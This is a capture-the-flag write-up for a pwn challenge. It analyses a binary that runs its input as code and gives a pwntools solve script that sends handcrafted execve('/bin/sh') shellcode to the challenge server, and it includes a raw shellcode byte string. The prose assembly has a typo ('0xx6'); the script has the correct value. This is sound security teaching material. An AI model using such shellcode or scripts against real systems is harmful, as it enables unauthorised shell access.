---
description: Shellcode with some limitation
---

# popping around shell

## Problem

<details>

<summary>Description</summary>

what if \xff\d9?

`nc 157.230.247.65 9696`

</details>

<details>

<summary>tldr;</summary>

provide a shellcode that bypasses limitation to spawn shell on remote machine

</details>

## Solution

### Analysis

Given a binary _<mark style="color:green;">**shell.out**</mark>_, the first thing we will do is to check the binary type and its security implementation.

```bash
$ file shell.out 
shell.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=99ab9f9e7ec19cba2b41d1cc5d40af86f726014f, stripped

$ checksec --file=shell.out  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2     shell.out
```

basic analysis summary:

* _<mark style="color:green;">**x64 least-bit ELF**</mark>_ binary
* _<mark style="color:green;">**dynamically linked**</mark>_, so it’ll depend on system library
* _<mark style="color:green;">**stripped**</mark>_, means function and variable name from the source code is not carried
* _<mark style="color:green;">**Full RELRO**</mark>_, means that the GOT entry table is not writable
* _<mark style="color:red;">**No Stack Canary**</mark>_, means no additional checks if the stack is overflown
* _<mark style="color:green;">**NX enabled**</mark>_, means the stack is not executable
* _<mark style="color:red;">**No PIE**</mark>_, means base address is hard-coded and not randomized

The primary objective of this challenge is to navigate around limitations rather than pinpointing a vulnerability and taking advantage of it.

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 120000.png" alt=""><figcaption><p>decompiled main</p></figcaption></figure>

By examining the decompiled code in ghidra, we observe that the binary receives input data, saves it into a variable and tries to execute it as a function. If we can supply functional shellcode to the binary, it should spawn a shell for us.

we can potentially use _<mark style="color:green;">asm(shellcraft.sh())</mark>_, which ends up with 48 bytes of shellcode thus exceeding our input. It appears that we will need to create our own shellcode, which is likely the intended solution according to the author.&#x20;

So let’s discuss what our goal is, to spawn a shell we want to call _<mark style="color:green;">**execve('/bin/sh')**</mark>_ that is, a syscall that requires the following registers to be equal to a specific value accordingly:

1. _<mark style="color:blue;">**$RAX**</mark>_ = 0x3b
2. _<mark style="color:blue;">**$RDI**</mark>_ = a pointer to ‘/bin/sh’ string
3. _<mark style="color:blue;">**$RSI**</mark>_ = 0x0
4. _<mark style="color:blue;">**$RDX**</mark>_ = 0x0

to read more about this you can follow this link:

* [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
* [parameter registers](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html)

Thankfully, the author is nice enough to include the string within the binary, we can use ghidra to search for strings and we’ll find the address to it and because PIE is not enabled, we can simply point to it without worrying about address randomization.

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 121443.png" alt=""><figcaption><p>Strings in ghidra</p></figcaption></figure>

### Exploitation

to save up memory so we’ll use the 32-bit registers to make the syscall shorter. Below is the setup to register in assembly

```armasm
mov edi, 0x601010;
xor esi, esi;
xor edx, edx;
mov eax, 0xx6
```

<details>

<summary><em><mark style="color:green;"><strong>Solve Script</strong></mark></em></summary>

{% code title="Exploit.py" lineNumbers="true" %}
```python
#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './shell.out'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '157.230.247.65', 9696

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

binsh_addr = 0x601010

# reference: https://ctftime.org/writeup/24007
# shellcode = asm(shellcraft.sh())
# shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
shellcode = asm('mov edi, 0x601010; xor esi, esi; xor edx, edx; mov eax, 0x3b; syscall;')

info('shellcode length: %#d', len(shellcode))
payload = flat([
    shellcode
])

# sending payload
io.send(payload)

io.interactive()
```
{% endcode %}

</details>

## Flag

<figure><img src="../../../.gitbook/assets/Screenshot 2023-07-03 135139.png" alt="" width="563"><figcaption><p>get shell and read flag</p></figcaption></figure>

> _**flag{shell\_is\_just\_\xff\d9}**_
